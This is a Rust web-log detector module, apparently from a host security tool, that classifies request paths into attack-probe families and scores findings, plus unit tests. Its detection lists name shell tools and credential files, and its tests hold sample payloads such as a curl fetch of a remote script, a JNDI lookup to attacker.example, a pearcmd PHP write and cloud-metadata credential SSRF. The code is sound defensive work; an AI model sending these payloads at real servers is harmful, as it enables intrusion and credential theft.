use crate::detectors::{
    evidence, field_is_allowlisted, string_field, DetectContext, Detector, EventIndex,
};
use crate::rules::model::RuleMetadata;
use sentinel_core::{Category, Finding, RawEvent, Severity};
use std::collections::{BTreeMap, BTreeSet};

pub struct WebDetector;

impl Detector for WebDetector {
    fn name(&self) -> &'static str {
        "web_rules"
    }

    fn rules(&self) -> Vec<RuleMetadata> {
        vec![
            RuleMetadata::new(
                "WEB-001",
                "Web vulnerability probing detected",
                Category::Web,
                Severity::Medium,
                "Web logs contain paths commonly used by automated vulnerability scanners.",
            ),
            RuleMetadata::new(
                "WEB-002",
                "Repeated web errors from one source",
                Category::Web,
                Severity::Low,
                "One source IP produced repeated 403/404 responses in the scanned window.",
            ),
        ]
    }

    fn detect(&self, events: &[RawEvent], ctx: &DetectContext) -> Vec<Finding> {
        detect_web_events(
            events.iter().filter(|event| event.kind == "web_access"),
            ctx,
        )
    }

    fn detect_indexed(
        &self,
        _events: &[RawEvent],
        index: &EventIndex<'_>,
        ctx: &DetectContext,
    ) -> Vec<Finding> {
        detect_web_events(index.kind("web_access"), ctx)
    }
}

fn detect_web_events<'a>(
    events: impl IntoIterator<Item = &'a RawEvent>,
    ctx: &DetectContext,
) -> Vec<Finding> {
    let mut findings = Vec::new();
    let mut errors_by_ip: BTreeMap<String, usize> = BTreeMap::new();
    let mut probes = BTreeMap::<ProbeGroupKey, ProbeGroup>::new();
    let mut probe_ips = BTreeSet::<String>::new();

    for event in events {
        let ip = string_field(event, "ip");
        if field_is_allowlisted(&ip, &ctx.config.allowlist.ips) {
            continue;
        }
        if event.field("proxy_source_unresolved") == Some("true")
            && ctx.config.web.suppress_unresolved_trusted_proxy
        {
            continue;
        }
        let path = string_field(event, "path");
        if let Some(signature) = classify_probe_path(&path) {
            probe_ips.insert(ip.clone());
            let key = ProbeGroupKey { ip };
            probes.entry(key).or_default().push(event, signature);
        }
        if matches!(event.field("status"), Some("403") | Some("404")) {
            *errors_by_ip.entry(string_field(event, "ip")).or_insert(0) += 1;
        }
    }

    findings.extend(
        probes
            .into_iter()
            .map(|(key, group)| web_probe_group(key, group, ctx)),
    );
    for (ip, count) in errors_by_ip {
        if !probe_ips.contains(&ip) && count >= ctx.config.web.error_burst_threshold {
            findings.push(web_error_burst(&ip, count, ctx));
        }
    }
    findings
}

#[derive(Debug, Clone, Copy, PartialEq, Eq, PartialOrd, Ord)]
enum ProbeFamily {
    EnvFile,
    GitExposure,
    PhpUnitEvalStdin,
    CgiShellTraversal,
    CommandInjection,
    PhpConfigInjection,
    LfiFileRead,
    PhpStreamWrapper,
    JavaJndiInjection,
    SsrfMetadata,
    TemplateInjection,
    DeserializationProbe,
    SqlInjection,
    PathTraversal,
    PhpMyAdmin,
    WordpressAdmin,
    BoaForm,
    Actuator,
    ServerStatus,
    GenericCgi,
}

impl ProbeFamily {
    fn from_id(value: &str) -> Option<Self> {
        match value {
            "env_file" => Some(Self::EnvFile),
            "git_exposure" => Some(Self::GitExposure),
            "phpunit_eval_stdin" => Some(Self::PhpUnitEvalStdin),
            "cgi_shell_traversal" => Some(Self::CgiShellTraversal),
            "command_injection" => Some(Self::CommandInjection),
            "php_config_injection" => Some(Self::PhpConfigInjection),
            "lfi_file_read" => Some(Self::LfiFileRead),
            "php_stream_wrapper" => Some(Self::PhpStreamWrapper),
            "java_jndi_injection" => Some(Self::JavaJndiInjection),
            "ssrf_metadata" => Some(Self::SsrfMetadata),
            "template_injection" => Some(Self::TemplateInjection),
            "deserialization_probe" => Some(Self::DeserializationProbe),
            "sql_injection" => Some(Self::SqlInjection),
            "path_traversal" => Some(Self::PathTraversal),
            "phpmyadmin" => Some(Self::PhpMyAdmin),
            "wordpress_admin" => Some(Self::WordpressAdmin),
            "boaform" => Some(Self::BoaForm),
            "actuator" => Some(Self::Actuator),
            "server_status" => Some(Self::ServerStatus),
            "generic_cgi" => Some(Self::GenericCgi),
            _ => None,
        }
    }

    fn id(self) -> &'static str {
        match self {
            Self::EnvFile => "env_file",
            Self::GitExposure => "git_exposure",
            Self::PhpUnitEvalStdin => "phpunit_eval_stdin",
            Self::CgiShellTraversal => "cgi_shell_traversal",
            Self::CommandInjection => "command_injection",
            Self::PhpConfigInjection => "php_config_injection",
            Self::LfiFileRead => "lfi_file_read",
            Self::PhpStreamWrapper => "php_stream_wrapper",
            Self::JavaJndiInjection => "java_jndi_injection",
            Self::SsrfMetadata => "ssrf_metadata",
            Self::TemplateInjection => "template_injection",
            Self::DeserializationProbe => "deserialization_probe",
            Self::SqlInjection => "sql_injection",
            Self::PathTraversal => "path_traversal",
            Self::PhpMyAdmin => "phpmyadmin",
            Self::WordpressAdmin => "wordpress_admin",
            Self::BoaForm => "boaform",
            Self::Actuator => "actuator",
            Self::ServerStatus => "server_status",
            Self::GenericCgi => "generic_cgi",
        }
    }

    fn base_severity(self) -> Severity {
        match self {
            Self::CgiShellTraversal
            | Self::CommandInjection
            | Self::PhpConfigInjection
            | Self::LfiFileRead
            | Self::PhpStreamWrapper
            | Self::JavaJndiInjection
            | Self::SsrfMetadata
            | Self::TemplateInjection
            | Self::DeserializationProbe
            | Self::SqlInjection => Severity::Medium,
            _ => Severity::Low,
        }
    }

    fn success_severity(self) -> Severity {
        match self {
            Self::EnvFile
            | Self::GitExposure
            | Self::PhpUnitEvalStdin
            | Self::CgiShellTraversal
            | Self::CommandInjection
            | Self::PhpConfigInjection
            | Self::LfiFileRead
            | Self::PhpStreamWrapper
            | Self::JavaJndiInjection
            | Self::SsrfMetadata
            | Self::TemplateInjection
            | Self::DeserializationProbe
            | Self::SqlInjection
            | Self::PathTraversal => Severity::High,
            _ => Severity::Medium,
        }
    }

    fn protected_severity(self) -> Severity {
        match self {
            Self::EnvFile
            | Self::GitExposure
            | Self::PhpUnitEvalStdin
            | Self::CgiShellTraversal
            | Self::CommandInjection
            | Self::PhpConfigInjection
            | Self::LfiFileRead
            | Self::PhpStreamWrapper
            | Self::JavaJndiInjection
            | Self::SsrfMetadata
            | Self::TemplateInjection
            | Self::DeserializationProbe
            | Self::SqlInjection
            | Self::PathTraversal => Severity::Medium,
            _ => Severity::Low,
        }
    }

    fn is_exploit(self) -> bool {
        matches!(
            self,
            Self::CgiShellTraversal
                | Self::CommandInjection
                | Self::PhpConfigInjection
                | Self::LfiFileRead
                | Self::PhpStreamWrapper
                | Self::JavaJndiInjection
                | Self::SsrfMetadata
                | Self::TemplateInjection
                | Self::DeserializationProbe
                | Self::SqlInjection
                | Self::PhpUnitEvalStdin
        )
    }

    fn blocks_on_single_attempt(self) -> bool {
        matches!(
            self,
            Self::CgiShellTraversal
                | Self::CommandInjection
                | Self::PhpConfigInjection
                | Self::LfiFileRead
                | Self::PhpStreamWrapper
                | Self::JavaJndiInjection
                | Self::SsrfMetadata
                | Self::PhpUnitEvalStdin
        )
    }
}

pub(crate) fn probe_family_is_exploit(family: &str) -> bool {
    ProbeFamily::from_id(family).is_some_and(ProbeFamily::is_exploit)
}

pub(crate) fn probe_family_blocks_on_single_attempt(family: &str) -> bool {
    ProbeFamily::from_id(family).is_some_and(ProbeFamily::blocks_on_single_attempt)
}

pub(crate) fn storage_relevant_web_event(event: &RawEvent) -> bool {
    event
        .field("path")
        .is_some_and(|path| classify_probe_path(path).is_some())
}

#[derive(Debug, Clone, Copy)]
struct ProbeSignature {
    family: ProbeFamily,
}

#[derive(Debug, Clone, Copy, PartialEq, Eq, PartialOrd, Ord)]
enum ResponseProfile {
    Successful,
    Protected,
    Redirected,
    MissingOrRejected,
    ServerError,
    Unknown,
}

impl ResponseProfile {
    fn from_status(status: &str) -> Self {
        match status.parse::<u16>().ok() {
            Some(200..=299) => Self::Successful,
            Some(401 | 403) => Self::Protected,
            Some(300..=399) => Self::Redirected,
            Some(400..=499) => Self::MissingOrRejected,
            Some(500..=599) => Self::ServerError,
            _ => Self::Unknown,
        }
    }

    fn id(self) -> &'static str {
        match self {
            Self::Successful => "successful_response",
            Self::Protected => "protected_response",
            Self::Redirected => "redirected_response",
            Self::MissingOrRejected => "missing_or_rejected",
            Self::ServerError => "server_error",
            Self::Unknown => "unknown_response",
        }
    }

    fn severity_for(self, family: ProbeFamily) -> Severity {
        match self {
            Self::Successful => family.success_severity(),
            Self::Protected => family.protected_severity(),
            Self::ServerError => Severity::Medium,
            Self::Redirected | Self::MissingOrRejected | Self::Unknown => family.base_severity(),
        }
    }

    fn risk_rank(self) -> u8 {
        match self {
            Self::Successful => 5,
            Self::Protected => 4,
            Self::ServerError => 3,
            Self::MissingOrRejected => 2,
            Self::Redirected => 1,
            Self::Unknown => 0,
        }
    }
}

#[derive(Debug, Clone, PartialEq, Eq, PartialOrd, Ord)]
struct ProbeGroupKey {
    ip: String,
}

#[derive(Debug, Default)]
struct ProbeGroup {
    count: usize,
    strongest_family: Option<ProbeFamily>,
    strongest_response: Option<ResponseProfile>,
    severity: Option<Severity>,
    families: BTreeSet<String>,
    responses: BTreeSet<String>,
    methods: BTreeSet<String>,
    statuses: BTreeSet<String>,
    log_sources: BTreeSet<String>,
    sample_paths: Vec<String>,
    source_is_trusted_proxy: bool,
    proxy_source_unresolved: bool,
    proxy_ips: BTreeSet<String>,
}

impl ProbeGroup {
    fn push(&mut self, event: &RawEvent, signature: ProbeSignature) {
        self.count += 1;
        let response = ResponseProfile::from_status(event.field("status").unwrap_or(""));
        let severity = response.severity_for(signature.family);
        self.severity = Some(max_severity(self.severity, severity));
        self.families.insert(signature.family.id().to_string());
        self.responses.insert(response.id().to_string());
        let candidate_rank = probe_pair_rank(signature.family, response, severity);
        let current_rank =
            self.strongest_family
                .zip(self.strongest_response)
                .map(|(family, response)| {
                    probe_pair_rank(family, response, response.severity_for(family))
                });
        if current_rank.map_or(true, |current| candidate_rank > current) {
            self.strongest_family = Some(signature.family);
            self.strongest_response = Some(response);
        }
        insert_nonempty(&mut self.methods, event.field("method"));
        insert_nonempty(&mut self.statuses, event.field("status"));
        insert_nonempty(&mut self.log_sources, event.field("log_source"));
        if event.field("source_is_trusted_proxy") == Some("true") {
            self.source_is_trusted_proxy = true;
            insert_nonempty(&mut self.proxy_ips, event.field("proxy_ip"));
        }
        if event.field("proxy_source_unresolved") == Some("true") {
            self.proxy_source_unresolved = true;
        }
        let path = string_field(event, "path");
        if !path.trim().is_empty()
            && !self.sample_paths.contains(&path)
            && self.sample_paths.len() < 5
        {
            self.sample_paths.push(path);
        }
    }
}

fn max_severity(current: Option<Severity>, candidate: Severity) -> Severity {
    match current {
        Some(current) if severity_rank(current) >= severity_rank(candidate) => current,
        _ => candidate,
    }
}

fn severity_rank(severity: Severity) -> u8 {
    match severity {
        Severity::Info => 0,
        Severity::Low => 1,
        Severity::Medium => 2,
        Severity::High => 3,
        Severity::Critical => 4,
    }
}

fn probe_family_rank(family: ProbeFamily) -> u8 {
    let severity_rank = severity_rank(family.success_severity());
    let exploit_rank = u8::from(family.is_exploit());
    severity_rank.saturating_mul(2).saturating_add(exploit_rank)
}

fn probe_pair_rank(family: ProbeFamily, response: ResponseProfile, severity: Severity) -> u16 {
    u16::from(severity_rank(severity)) * 100
        + u16::from(response.risk_rank()) * 10
        + u16::from(probe_family_rank(family))
}

fn insert_nonempty(values: &mut BTreeSet<String>, value: Option<&str>) {
    if let Some(value) = value.filter(|value| !value.trim().is_empty()) {
        values.insert(value.to_string());
    }
}

fn web_probe_group(key: ProbeGroupKey, group: ProbeGroup, ctx: &DetectContext) -> Finding {
    let family = group.strongest_family.unwrap_or(ProbeFamily::GenericCgi);
    let response = group.strongest_response.unwrap_or(ResponseProfile::Unknown);
    let subject = key.ip.clone();
    let severity = group.severity.unwrap_or(Severity::Low);
    let mut evidence_items = vec![
        evidence("ip", key.ip),
        evidence("probe_family", family.id()),
        evidence("probe_families", join_set(&group.families)),
        evidence("response_profile", response.id()),
        evidence("response_profiles", join_set(&group.responses)),
        evidence("request_count", group.count.to_string()),
        evidence("methods", join_set(&group.methods)),
        evidence("statuses", join_set(&group.statuses)),
        evidence("sample_paths", group.sample_paths.join(", ")),
        evidence("log_sources", join_set(&group.log_sources)),
    ];
    if group.source_is_trusted_proxy {
        evidence_items.push(evidence("source_is_trusted_proxy", "true"));
        evidence_items.push(evidence("proxy_ips", join_set(&group.proxy_ips)));
    }
    if group.proxy_source_unresolved {
        evidence_items.push(evidence("proxy_source_unresolved", "true"));
    }

    Finding::new(
        &ctx.host_id,
        "Web vulnerability probing detected",
        "Web requests match a known probing family. Similar paths from the same source are aggregated to reduce alert noise.",
        severity,
        Category::Web,
        "WEB-001",
        subject,
    )
    .with_evidence_deduped_by(evidence_items, &["ip"])
    .with_recommendations(vec![
        "Review whether any probe path returned a successful or protected response.".to_string(),
        "Correlate with file changes and process anomalies around the same time.".to_string(),
    ])
}

fn join_set(values: &BTreeSet<String>) -> String {
    values.iter().cloned().collect::<Vec<_>>().join(", ")
}

fn web_error_burst(ip: &str, count: usize, ctx: &DetectContext) -> Finding {
    Finding::new(
        &ctx.host_id,
        "Repeated web errors from one source",
        "One source IP generated many 403/404 responses in the scanned log window.",
        Severity::Low,
        Category::Web,
        "WEB-002",
        ip,
    )
    .with_evidence(vec![
        evidence("ip", ip),
        evidence("error_count", count.to_string()),
    ])
    .with_recommendations(vec![
        "Treat this as context unless it correlates with successful requests or host changes."
            .to_string(),
    ])
}

#[cfg(test)]
fn is_probe_path(path: &str) -> bool {
    classify_probe_path(path).is_some()
}

#[cfg(test)]
fn contains_attack_payload(path: &str) -> bool {
    let normalized = NormalizedPath::new(path);
    normalized.contains_command_payload() || normalized.contains_sql_payload()
}

fn classify_probe_path(path: &str) -> Option<ProbeSignature> {
    let normalized = NormalizedPath::new(path);
    if normalized.contains("cgi-bin") && normalized.contains("bin/sh") {
        return Some(ProbeSignature {
            family: ProbeFamily::CgiShellTraversal,
        });
    }
    if normalized.contains_command_payload() {
        return Some(ProbeSignature {
            family: ProbeFamily::CommandInjection,
        });
    }
    if normalized.contains_php_config_injection_payload() {
        return Some(ProbeSignature {
            family: ProbeFamily::PhpConfigInjection,
        });
    }
    if normalized.contains_lfi_file_read_payload() {
        return Some(ProbeSignature {
            family: ProbeFamily::LfiFileRead,
        });
    }
    if normalized.contains_php_stream_wrapper_payload() {
        return Some(ProbeSignature {
            family: ProbeFamily::PhpStreamWrapper,
        });
    }
    if normalized.contains_java_jndi_payload() {
        return Some(ProbeSignature {
            family: ProbeFamily::JavaJndiInjection,
        });
    }
    if normalized.contains_ssrf_metadata_payload() {
        return Some(ProbeSignature {
            family: ProbeFamily::SsrfMetadata,
        });
    }
    if normalized.contains_template_injection_payload() {
        return Some(ProbeSignature {
            family: ProbeFamily::TemplateInjection,
        });
    }
    if normalized.contains_deserialization_payload() {
        return Some(ProbeSignature {
            family: ProbeFamily::DeserializationProbe,
        });
    }
    if normalized.contains_sql_payload() {
        return Some(ProbeSignature {
            family: ProbeFamily::SqlInjection,
        });
    }
    if normalized.contains("vendor/phpunit") && normalized.contains("eval-stdin.php") {
        return Some(ProbeSignature {
            family: ProbeFamily::PhpUnitEvalStdin,
        });
    }
    for (marker, family) in [
        (".env", ProbeFamily::EnvFile),
        ("/.git", ProbeFamily::GitExposure),
        ("wp-admin", ProbeFamily::WordpressAdmin),
        ("phpmyadmin", ProbeFamily::PhpMyAdmin),
        ("boaform", ProbeFamily::BoaForm),
        ("actuator", ProbeFamily::Actuator),
        ("server-status", ProbeFamily::ServerStatus),
        ("/etc/passwd", ProbeFamily::PathTraversal),
        ("../", ProbeFamily::PathTraversal),
        ("cgi-bin", ProbeFamily::GenericCgi),
    ] {
        if normalized.contains(marker) {
            return Some(ProbeSignature { family });
        }
    }
    None
}

struct NormalizedPath {
    raw: String,
    decoded: String,
    spaced: String,
}

impl NormalizedPath {
    fn new(path: &str) -> Self {
        let raw = path.to_ascii_lowercase();
        let decoded = percent_decode_lossy(path).to_ascii_lowercase();
        let spaced = decoded.replace('+', " ");
        Self {
            raw,
            decoded,
            spaced,
        }
    }

    fn contains(&self, marker: &str) -> bool {
        self.raw.contains(marker) || self.decoded.contains(marker)
    }

    fn contains_command_payload(&self) -> bool {
        has_shell_expansion(&self.spaced) || has_command_after_shell_operator(&self.spaced)
    }

    fn contains_php_config_injection_payload(&self) -> bool {
        let value = &self.spaced;
        let pearcmd_config_create = self.contains("pearcmd") && self.contains("config-create");
        let traversal_php_write = has_path_traversal(value)
            && has_php_code_marker(value)
            && (value.contains("/tmp/") || value.contains("config-create"));
        pearcmd_config_create || traversal_php_write
    }

    fn contains_lfi_file_read_payload(&self) -> bool {
        has_path_traversal(&self.spaced)
            && [
                "/etc/passwd",
                "/etc/shadow",
                "/proc/self/environ",
                "/proc/self/cmdline",
                "/windows/win.ini",
            ]
            .iter()
            .any(|marker| self.spaced.contains(marker))
    }

    fn contains_php_stream_wrapper_payload(&self) -> bool {
        [
            "php://filter",
            "php://input",
            "data://text",
            "expect://",
            "phar://",
            "zip://",
        ]
        .iter()
        .any(|marker| self.spaced.contains(marker))
    }

    fn contains_java_jndi_payload(&self) -> bool {
        self.spaced.contains("${jndi:")
            || self.spaced.contains("$%7bjndi:")
            || self.spaced.contains("%24%7bjndi:")
    }

    fn contains_ssrf_metadata_payload(&self) -> bool {
        self.spaced.contains("metadata.google.internal")
            || self.spaced.contains("metadata/computemetadata/v1")
            || (self.spaced.contains("169.254.169.254")
                && (self.spaced.contains("metadata") || self.spaced.contains("latest")))
            || (self.spaced.contains("100.100.100.200")
                && (self.spaced.contains("metadata") || self.spaced.contains("latest")))
    }

    fn contains_template_injection_payload(&self) -> bool {
        let value = &self.spaced;
        (value.contains("{{") && value.contains("}}") && has_template_expression_marker(value))
            || value.contains("<%=7*7%>")
            || value.contains("${7*7}")
    }

    fn contains_deserialization_payload(&self) -> bool {
        [
            "ysoserial",
            "commonscollections",
            "java.util.priorityqueue",
            "ro0ab",
            "aced0005",
        ]
        .iter()
        .any(|marker| self.spaced.contains(marker))
    }

    fn contains_sql_payload(&self) -> bool {
        self.spaced.contains(" or 1=1") || self.spaced.contains("union select")
    }
}

fn has_path_traversal(value: &str) -> bool {
    value.contains("../") || value.contains("..\\") || value.contains("%2e%2e")
}

fn has_php_code_marker(value: &str) -> bool {
    value.contains("<?")
        && [
            "echo",
            "eval",
            "assert",
            "system",
            "shell_exec",
            "passthru",
            "md5",
            "file_put_contents",
            "base64_decode",
        ]
        .iter()
        .any(|token| value.contains(token))
}

fn has_template_expression_marker(value: &str) -> bool {
    [
        "7*7",
        "config.",
        "self.__",
        "__class__",
        "__mro__",
        "request.application",
    ]
    .iter()
    .any(|marker| value.contains(marker))
}

fn has_shell_expansion(value: &str) -> bool {
    has_command_after_marker(value, "$(") || has_command_after_marker(value, "`")
}

fn has_command_after_shell_operator(value: &str) -> bool {
    [";", "|", "&&"]
        .iter()
        .any(|operator| command_after_operator(value, operator))
}

fn command_after_operator(value: &str, operator: &str) -> bool {
    value.split(operator).skip(1).any(|tail| {
        tail.split(|ch: char| ch.is_whitespace() || ch == '/' || ch == '&' || ch == '|')
            .filter(|token| !token.is_empty())
            .take(3)
            .any(is_shell_command_token)
    })
}

fn has_command_after_marker(value: &str, marker: &str) -> bool {
    value.split(marker).skip(1).any(|tail| {
        tail.split(|ch: char| {
            ch.is_whitespace()
                || matches!(
                    ch,
                    '/' | '&' | '|' | ';' | ')' | '(' | '"' | '\'' | '`' | '<' | '>'
                )
        })
        .filter(|token| !token.is_empty())
        .take(3)
        .any(is_shell_command_token)
    })
}

fn is_shell_command_token(token: &str) -> bool {
    matches!(
        token,
        "curl" | "wget" | "bash" | "sh" | "nc" | "ncat" | "id" | "whoami" | "uname" | "cat"
    )
}

fn percent_decode_lossy(value: &str) -> String {
    let bytes = value.as_bytes();
    let mut decoded = Vec::with_capacity(bytes.len());
    let mut index = 0;
    while index < bytes.len() {
        if bytes[index] == b'%' && index + 2 < bytes.len() {
            if let (Some(high), Some(low)) =
                (hex_value(bytes[index + 1]), hex_value(bytes[index + 2]))
            {
                decoded.push((high << 4) | low);
                index += 3;
                continue;
            }
        }
        decoded.push(bytes[index]);
        index += 1;
    }
    String::from_utf8_lossy(&decoded).into_owned()
}

fn hex_value(value: u8) -> Option<u8> {
    match value {
        b'0'..=b'9' => Some(value - b'0'),
        b'a'..=b'f' => Some(value - b'a' + 10),
        b'A'..=b'F' => Some(value - b'A' + 10),
        _ => None,
    }
}

#[cfg(test)]
mod tests {
    use super::{
        contains_attack_payload, is_probe_path, probe_family_blocks_on_single_attempt,
        probe_family_is_exploit, ProbeFamily, WebDetector,
    };
    use crate::detectors::{DetectContext, Detector};
    use sentinel_core::{RawEvent, SentinelConfig, Severity};
    use std::sync::Arc;

    #[test]
    fn recognizes_common_web_probe_paths() {
        assert!(is_probe_path("/.env"));
        assert!(is_probe_path(
            "/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php"
        ));
        assert!(contains_attack_payload("/index.php?q=1%20union%20select"));
        assert!(!is_probe_path("/assets/app.css"));
    }

    #[test]
    fn web_error_burst_threshold_is_configurable() {
        let mut config = SentinelConfig::default();
        config.web.error_burst_threshold = 3;
        let ctx = DetectContext::new(Arc::new(config));
        let events = vec![
            access_error("203.0.113.10", "/missing-1"),
            access_error("203.0.113.10", "/missing-2"),
            access_error("203.0.113.10", "/missing-3"),
            access_error("203.0.113.11", "/missing-1"),
            access_error("203.0.113.11", "/missing-2"),
        ];

        let findings = WebDetector.detect(&events, &ctx);

        assert_eq!(findings.len(), 1);
        assert_eq!(findings[0].rule_id, "WEB-002");
        assert_eq!(findings[0].subject, "203.0.113.10");
    }

    #[test]
    fn web_probe_paths_are_aggregated_by_source_ip() {
        let ctx = DetectContext::new(Arc::new(SentinelConfig::default()));
        let events = vec![
            access_error(
                "198.51.100.7",
                "/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php",
            ),
            access_error(
                "198.51.100.7",
                "/blog/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php",
            ),
            access_error(
                "198.51.100.7",
                "/workspace/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php",
            ),
            access_event("198.51.100.7", "GET", "/.env", "200"),
        ];

        let findings = WebDetector.detect(&events, &ctx);

        assert_eq!(findings.len(), 1);
        assert_eq!(findings[0].rule_id, "WEB-001");
        assert_eq!(findings[0].severity, Severity::High);
        assert!(findings[0]
            .evidence
            .iter()
            .any(|item| item.key == "request_count" && item.value == "4"));
        assert!(findings[0]
            .evidence
            .iter()
            .any(|item| { item.key == "probe_families" && item.value.contains("env_file") }));
        assert!(findings[0].evidence.iter().any(|item| {
            item.key == "response_profiles" && item.value.contains("successful_response")
        }));
        assert_eq!(
            findings[0]
                .evidence
                .iter()
                .find(|item| item.key == "probe_family")
                .map(|item| item.value.as_str()),
            Some("env_file")
        );
    }

    #[test]
    fn unresolved_trusted_proxy_sources_are_suppressed_by_default() {
        let ctx = DetectContext::new(Arc::new(SentinelConfig::default()));
        let event = access_event("172.70.12.9", "GET", "/.env", "404")
            .with_field("source_is_trusted_proxy", "true")
            .with_field("proxy_source_unresolved", "true");

        let findings = WebDetector.detect(&[event], &ctx);

        assert!(findings.is_empty());
    }

    #[test]
    fn encoded_command_payload_is_classified_without_flagging_normal_query() {
        let ctx = DetectContext::new(Arc::new(SentinelConfig::default()));
        let malicious = access_event(
            "203.0.113.40",
            "GET",
            "/index.php?x=%3Bcurl%20http://203.0.113.9/a.sh",
            "404",
        );
        let normal = access_event("203.0.113.41", "GET", "/search?q=curling+club", "404");
        let quoted_query = access_event("203.0.113.42", "GET", "/search?q=%60example%60", "404");

        let findings = WebDetector.detect(&[malicious, normal, quoted_query], &ctx);

        assert_eq!(findings.len(), 1);
        assert_eq!(findings[0].rule_id, "WEB-001");
        assert!(findings[0]
            .evidence
            .iter()
            .any(|item| { item.key == "probe_family" && item.value == "command_injection" }));
    }

    #[test]
    fn pearcmd_php_config_injection_is_high_confidence_exploit() {
        let ctx = DetectContext::new(Arc::new(SentinelConfig::default()));
        let event = access_event(
            "203.0.113.50",
            "GET",
            "/index.php?lang=../../../../../../../../usr/local/lib/php/pearcmd&+config-create+/&/<?echo(md5(\\x22hi\\x22));?>+/tmp/index1.php",
            "404",
        );

        let findings = WebDetector.detect(&[event], &ctx);

        assert_eq!(findings.len(), 1);
        assert_eq!(findings[0].rule_id, "WEB-001");
        assert_eq!(findings[0].severity, Severity::Medium);
        assert!(findings[0]
            .evidence
            .iter()
            .any(|item| { item.key == "probe_family" && item.value == "php_config_injection" }));
    }

    #[test]
    fn high_confidence_web_exploit_families_are_classified() {
        let ctx = DetectContext::new(Arc::new(SentinelConfig::default()));
        let cases = [
            ("/download?file=../../../../etc/passwd", "lfi_file_read"),
            (
                "/index.php?page=php://filter/convert.base64-encode/resource=config.php",
                "php_stream_wrapper",
            ),
            (
                "/?q=${jndi:ldap://attacker.example/a}",
                "java_jndi_injection",
            ),
            (
                "/fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/",
                "ssrf_metadata",
            ),
            ("/search?q={{7*7}}", "template_injection"),
            ("/api?payload=ysoserial", "deserialization_probe"),
        ];

        for (path, family) in cases {
            let findings =
                WebDetector.detect(&[access_event("203.0.113.60", "GET", path, "404")], &ctx);

            assert_eq!(findings.len(), 1, "path should be classified: {path}");
            assert_eq!(findings[0].rule_id, "WEB-001");
            assert_eq!(findings[0].severity, Severity::Medium);
            assert!(findings[0]
                .evidence
                .iter()
                .any(|item| { item.key == "probe_family" && item.value == family }));
        }
    }

    #[test]
    fn active_response_probe_family_policy_is_owned_by_web_rules() {
        assert!(probe_family_is_exploit("lfi_file_read"));
        assert!(probe_family_blocks_on_single_attempt("lfi_file_read"));
        assert!(probe_family_is_exploit("template_injection"));
        assert!(!probe_family_blocks_on_single_attempt("template_injection"));
        assert!(!probe_family_is_exploit("env_file"));
        assert!(!probe_family_blocks_on_single_attempt("env_file"));
        assert!(!probe_family_is_exploit("unknown_family"));
    }

    #[test]
    fn probe_family_ids_round_trip() {
        for family in [
            ProbeFamily::EnvFile,
            ProbeFamily::GitExposure,
            ProbeFamily::PhpUnitEvalStdin,
            ProbeFamily::CgiShellTraversal,
            ProbeFamily::CommandInjection,
            ProbeFamily::PhpConfigInjection,
            ProbeFamily::LfiFileRead,
            ProbeFamily::PhpStreamWrapper,
            ProbeFamily::JavaJndiInjection,
            ProbeFamily::SsrfMetadata,
            ProbeFamily::TemplateInjection,
            ProbeFamily::DeserializationProbe,
            ProbeFamily::SqlInjection,
            ProbeFamily::PathTraversal,
            ProbeFamily::PhpMyAdmin,
            ProbeFamily::WordpressAdmin,
            ProbeFamily::BoaForm,
            ProbeFamily::Actuator,
            ProbeFamily::ServerStatus,
            ProbeFamily::GenericCgi,
        ] {
            assert_eq!(ProbeFamily::from_id(family.id()), Some(family));
        }
    }

    #[test]
    fn successful_sensitive_probe_is_high_value() {
        let ctx = DetectContext::new(Arc::new(SentinelConfig::default()));
        let event = access_event("203.0.113.20", "GET", "/.env", "200");

        let findings = WebDetector.detect(&[event], &ctx);

        assert_eq!(findings.len(), 1);
        assert_eq!(findings[0].rule_id, "WEB-001");
        assert_eq!(findings[0].severity, Severity::High);
    }

    #[test]
    fn exploit_payload_probe_aggregates_as_medium_when_rejected() {
        let ctx = DetectContext::new(Arc::new(SentinelConfig::default()));
        let events = vec![
            access_event(
                "203.0.113.30",
                "POST",
                "/cgi-bin/.%2e/.%2e/.%2e/bin/sh",
                "400",
            ),
            access_event(
                "203.0.113.30",
                "POST",
                "/cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh",
                "400",
            ),
        ];

        let findings = WebDetector.detect(&events, &ctx);

        assert_eq!(findings.len(), 1);
        assert_eq!(findings[0].rule_id, "WEB-001");
        assert_eq!(findings[0].severity, Severity::Medium);
        assert!(findings[0]
            .evidence
            .iter()
            .any(|item| { item.key == "probe_family" && item.value == "cgi_shell_traversal" }));
    }

    fn access_error(ip: &str, path: &str) -> RawEvent {
        access_event(ip, "GET", path, "404")
    }

    fn access_event(ip: &str, method: &str, path: &str, status: &str) -> RawEvent {
        RawEvent::new("web", "web_access")
            .with_field("ip", ip)
            .with_field("method", method)
            .with_field("path", path)
            .with_field("status", status)
            .with_field("log_source", "/var/log/nginx/access.log")
    }
}
